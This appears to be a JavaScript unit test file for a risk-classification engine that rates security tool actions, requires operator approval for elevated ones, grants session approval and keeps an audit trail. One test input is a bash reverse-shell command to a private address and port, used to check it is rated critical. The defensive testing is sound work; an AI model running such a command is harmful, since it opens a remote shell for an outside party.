const assert = require('assert');
const { RiskEngine } = require('../../src/security/risk-engine');

console.log('--- Testing RiskEngine ---');

// 1. Classification
const dns = RiskEngine.classifyAction('dns_lookup', { domain: 'example.com' });
assert.strictEqual(dns.riskLevel, 'READ');

const nmap = RiskEngine.classifyAction('nmap', { target: '192.168.1.1' });
assert.strictEqual(nmap.riskLevel, 'MEDIUM');

const nuclei = RiskEngine.classifyAction('nuclei', { target: 'http://test.com' });
assert.strictEqual(nuclei.riskLevel, 'HIGH');

const reverseShell = RiskEngine.classifyAction('shell', { command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' });
assert.strictEqual(reverseShell.riskLevel, 'CRITICAL');
console.log('✓ Risk levels classified appropriately across tools');

// 2. Policy evaluation: Ask policy
const engine = new RiskEngine({ defaultPolicy: 'ask' });
const readEval = engine.evaluate('dns_lookup', { domain: 'example.com' });
assert.strictEqual(readEval.allowed, true, 'READ should be allowed automatically');

const critEval = engine.evaluate('shell', { command: 'whoami' });
assert.strictEqual(critEval.allowed, false, 'CRITICAL should require operator consent under ask policy');
assert.strictEqual(critEval.requiresApproval, true);
console.log('✓ Policy evaluation requires approval for elevated risks');

// 3. Approval resolution
engine.grantSessionApproval('shell');
const postApproval = engine.evaluate('shell', { command: 'whoami' });
assert.strictEqual(postApproval.allowed, true, 'Session approval should permit subsequent calls');
console.log('✓ Session approval mechanism functions correctly');

// 4. Audit Log
const audit = engine.getAuditTrail();
assert(audit.length >= 2, 'Audit log should record all evaluated actions');
assert(audit.some(e => e.action === 'shell'), 'Audit log contains shell entry');
console.log('✓ Audit logging tracks actions reliably');

console.log('All RiskEngine unit tests passed!\n');
